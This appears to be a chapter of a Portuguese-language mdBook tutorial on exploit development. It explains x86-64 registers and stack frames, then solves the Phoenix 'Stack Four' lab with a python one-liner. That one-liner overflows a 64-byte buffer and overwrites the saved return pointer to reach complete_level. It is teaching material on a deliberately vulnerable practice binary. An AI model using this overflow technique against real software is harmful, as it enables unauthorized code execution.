<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stack Four - Um Livrinho Sobre Exploit Dev</title>
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="../favicon.svg">
        
        
        <link rel="shortcut icon" href="../favicon.png">
        
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        
        <link rel="stylesheet" href="../css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="../fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item "><a href="../intro/Intro.html">Intro</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../intro/Aventura.html">Aventura</a></li></ol></li><li class="chapter-item "><li class="part-title">Stack</li><li class="spacer"></li><li class="chapter-item "><div>Phoenix e Protostar</div></li><li class="chapter-item "><div>Estilo OSCP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Tib3rius BOF Prep</div></li><li class="chapter-item "><div>BrainPain</div></li></ol></li><li class="chapter-item "><div>Format Strings</div></li><li class="chapter-item "><div>Integer Overflow</div></li><li class="chapter-item "><div>Mitigações</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>DEP | W^X | NX</div></li><li class="chapter-item "><div>ASLR</div></li><li class="chapter-item "><div>Canaries</div></li></ol></li><li class="chapter-item "><div>Ret2LibC</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Explicação</div></li><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six (Ret2LibC)</div></li></ol></li></ol></li><li class="chapter-item "><div>ROP</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Explicação</div></li><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six (ROP)</div></li></ol></li></ol></li><li class="chapter-item "><div>ASLR</div></li><li class="chapter-item "><div>Canaries</div></li><li class="chapter-item affix "><li class="part-title">Heap</li><li class="spacer"></li><li class="chapter-item "><div>How to heap</div></li><li class="chapter-item affix "><li class="part-title">Misc</li><li class="spacer"></li><li class="chapter-item affix "><li class="part-title">Exploit Education</li><li class="chapter-item expanded "><a href="../phoenix/setup.html">Phoenix</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../phoenix/Stack.html">Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item expanded "><a href="../phoenix/StackFour.html" class="active">Stack Four</a></li><li class="chapter-item "><a href="../phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="../phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><div>Heap</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Heap Zero</div></li><li class="chapter-item "><div>Heap One</div></li><li class="chapter-item "><div>Heap Two</div></li><li class="chapter-item "><div>Heap Three</div></li></ol></li><li class="chapter-item "><div>Format</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Format Zero</div></li><li class="chapter-item "><div>Format One</div></li><li class="chapter-item "><div>Format Two</div></li><li class="chapter-item "><div>Format Three</div></li><li class="chapter-item "><div>Format Four</div></li></ol></li><li class="chapter-item "><div>Net</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Net One</div></li><li class="chapter-item "><div>Net Two</div></li><li class="chapter-item "><div>Net Three</div></li></ol></li><li class="chapter-item "><div>Final</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Final One</div></li><li class="chapter-item "><div>Final Two</div></li></ol></li></ol></li><li class="chapter-item "><div>Protostar</div></li><li class="chapter-item "><div>Nebula</div></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#-objetivo" id="-objetivo">🎯 Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execução do programa.</p>
<p>Esse desafio está nos preparando para o próximo, no qual nos redirecionaremos a execução para o nosso próprio código, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era viável nos anos 90, quando mecanismos de proteção não existiam. Por isso é chamado de buffer overflow clássico (ou <code>SRP BOF</code>, 
caso você goste de siglas)! :D</p>
<p>Se você souber inglês, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1><a class="header" href="#-conhecimento-preliminar" id="-conhecimento-preliminar">🛸 Conhecimento preliminar</a></h1>
<p>Se tem uma seção inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de segurança está firme e travado,
mantenha as mãos, pernas e canecas de café dentro do veículo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2><a class="header" href="#-assembly" id="-assembly">🤖 Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registradores - Introdução Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada à assembly (ASM), porém isso é para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq é a melhor e se alguem te disser o contrário, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM é uma representação legivel dos 0s e 1s das instruções do computador.
Ela pode ser transformada em machine code (código de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Então como você pode imaginar, é bem complicado, e a minha maneira de explicar pode não funcionar para você... Então vai com calma, le de outras fontes, assite 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3><a class="header" href="#-register-registros--registradores" id="-register-registros--registradores">📦 Register (Registros / Registradores)</a></h3>
<blockquote>
<p>Registers são pedaços de memória que ficam dentro do chip do processador,
semelhante a memória RAM, porém extremamente rápidos e pequenos.</p>
</blockquote>
<p>O seu tamanho é um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers são semelhantes à variáveis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4><a class="header" href="#-general-purpose-registers-gpr--registro-de-propósito-geral-" id="-general-purpose-registers-gpr--registro-de-propósito-geral-">🌍 General Purpose Registers (GPR) ( Registro de Propósito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endereços: 0 a 15) (uma versão antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O propósito deles historicamente costumava ser, mas não exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para operações_lógicas ou aritméticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras operações_cíclicas 
RDX Dados        -&gt; Multiplicação, input/output
R8 a 15          -&gt; você só precisa saber que eles existem
</code></pre>
<p>Alem disso, são usados para passar os argumentos para funções (explicação em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parametro)
RSI (2º parametro)
RDX (3º parametro)
...
</code></pre>
<p>Para os nossos proprositos, é mais vantajoso considerar que eles só servem para 
armazenar valores e passar argumentos</p>
<h4><a class="header" href="#-address-register--armazenam-endereços-da-stack-" id="-address-register--armazenam-endereços-da-stack-">💫 Address Register ( armazenam endereços da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução 
								que está sendo executada 
</code></pre>
<h4><a class="header" href="#-rflag" id="-rflag">🏁 RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de operações passadas.
Esses sinais são 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posição    Nome         Descrição 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matemática)
6          Zero          A operação resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4><a class="header" href="#-apêndice---curiosidade--nomenclatura-histórica" id="-apêndice---curiosidade--nomenclatura-histórica">🧠 Apêndice - Curiosidade : Nomenclatura histórica</a></h4>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamdo AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele é chamado RAX e tem o tamanho de 2 EAX

Para propositos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tras das cenas, o computador interpreta EAX como a segunda metade do RAX

Então não estranhe caso alguem fale de EIP numa
arquitetura x64, pois na linguagem informal não faz diferença

Mas caso você vá analisar o register em um debugger, a diferença importa :D
</code></pre>
<h3><a class="header" href="#-instruções" id="-instruções">⚡ Instruções</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu propósito na realidade não é relevante para a explicação !</p>
</blockquote>
<p>As instruções são o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da operação vem primeiro e o &quot;parâmetro&quot; depois</p>
<p>Caso os dois argumentos da instrução sejam valores, a operação executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da operação será salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adição 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtração 4 - 1 = 3
                 Caso fosse ao contrário a ordem &quot;alvo&quot; &quot;parâmetro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instruções que serão importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; Só remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do parâmetro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no epílogo ( explicadas em breve )
           ret     -&gt; retorna da função ( em essência é só um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores lógicos, têm o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localização incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ≤
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ≥
</code></pre>
<p>Caso vc não saiba os operadores lógicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador Lógico</a></p>
<h3><a class="header" href="#-funções-prólogo-e-epílogo" id="-funções-prólogo-e-epílogo">🦄 Funções, Prólogo e Epílogo</a></h3>
<p>Agora tá na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, então é bom dar uma revisada, né?</p>
<h4><a class="header" href="#-revisão" id="-revisão">☕ Revisão</a></h4>
<pre><code>- A stack é como uma pilha de pratos: último a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A memória é representada de cabeça pra baixo!
    - A base fica em um endereço maior (parte de baixo)
    - O topo fica em um endereço menor (parte de cima)
    - Portanto, a stack cresce em direção à valores menores :D 

</code></pre>
<h4><a class="header" href="#-stack-frame--moldura-da-stack-" id="-stack-frame--moldura-da-stack-">🖼️ Stack Frame ( Moldura da Stack )</a></h4>
<p>Você se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A região entre os dois é chamada de stack frame: um pedaço da stack :D</p>
<p>A stack como um todo possui vários stack frames, porém só um está ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Prólogo e Epílogo, respectivamente.</p>
<blockquote>
<p>Obs: Quando você muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>função()</strong>, precisamos criar um frame novo para ela por meio de um Prólogo, e salvar o endereço do frame atual. Ao retornar, esse frame será destruído com um Epílogo e o antigo será restaurado !</p>
<p>Para a explicação, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly é legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> são definidas e nos já sabemos como isso funciona, agora vamos chamar a função, que é aonde a mágica acontece !</p>
<h4><a class="header" href="#-prólogo" id="-prólogo">🔒 Prólogo</a></h4>
<ul>
<li>Se a função recever argumentos, passar eles
Chamar a função </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a função</li>
</ul>
<h5><a class="header" href="#se-a-função-receber-argumentos-salvar-eles" id="se-a-função-receber-argumentos-salvar-eles">Se a função receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos são passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1º parametro)
RSI (2º parametro)
RDX (3º parametro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser nescessário dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4><a class="header" href="#salvar-o-frame-atual" id="salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porém não o valor atual,
	       ; e sim o endereço da próxima instrução 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4><a class="header" href="#criar-novo-frame" id="criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp até o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; até o rsp
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localizção
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaço na memória para essa função </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a função precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Variaveis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse método de chamar função, não importa a localização da memória de quando a função foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma função chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruído ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execução normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo então pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a função
</code></pre>
<h4><a class="header" href="#-epílogo" id="-epílogo">🔑 Epílogo</a></h4>
<p>O epilogo é bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instruções               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp até o rbp)</p>
<p>Atualmente, a stack está assim</p>
<pre><code class="language-x86asm">...                    
Variaveis print dois   A região não é apagada, pois consumiria processamento a toa!
...         O valores ficam largados lá até uma nova função escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatorio
...         Eles pode ser ignorado pois nem está mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> (remover o valor no topo da stack (ver acima por referencia), e colocalo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instrução
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instrução &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graças ao rbp e rip salvos ( o rip salvo é chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<h1><a class="header" href="#-caso-você-tenha-viajado-o-que-você-precisa-saber" id="-caso-você-tenha-viajado-o-que-você-precisa-saber">🌍 Caso você tenha viajado, o que você precisa saber</a></h1>
<p>Existem algumas variaveis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instrução que está sendo executada 
</code></pre>
<p>O RIP e o RBP atuais são salvos na stack quando chamamos uma função, junto das outras variaveis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na função
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos execicios anteriores, tambem conseguimos 
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execução do programa!</p>
<h1><a class="header" href="#-exploit" id="-exploit">🔥 Exploit</a></h1>
<h2><a class="header" href="#-analisar-o-programa" id="-analisar-o-programa">🔬 Analisar o programa</a></h2>
<p>O programa contem 3 funções: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do começo do nivel e chama start_level</p>
<p><code>complete_level</code> é a função que precisamos chamar</p>
<p><code>start_level</code> é onde a magica acontece: <code>gets()</code> (vulneravel) é chamada num <code>buffer[64]</code></p>
<h2><a class="header" href="#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa">⁉️ O compilador adicionou coisa???</a></h2>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A função normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip não mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
Então precisamos levar isso em consideração, não basta só olhar que o tamanho do buffer é 64 e colcoar 64 bytes de <code>padding</code>!</p>
<p>Em aplicações mais complexas, essa diferença pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferença usando ferramentas como fuzzers ou geradores de padrão...</p>
<p>Como nosso exemplo é simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
<h2><a class="header" href="#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level">🏠 Encontrar endereço de complete_level</a></h2>
<p>Você se lembra como faz? Nos usamos no execicio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora é a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereço:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais dificil! Se você chegou até aqui, parabens! :D</p>
<h1><a class="header" href="#-solução" id="-solução">💫 Solução</a></h1>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        
                            <a rel="prev" href="../phoenix/StackThree.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>
                        

                        
                            <a rel="next" href="../phoenix/StackFive.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>
                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                
                    <a rel="prev" href="../phoenix/StackThree.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
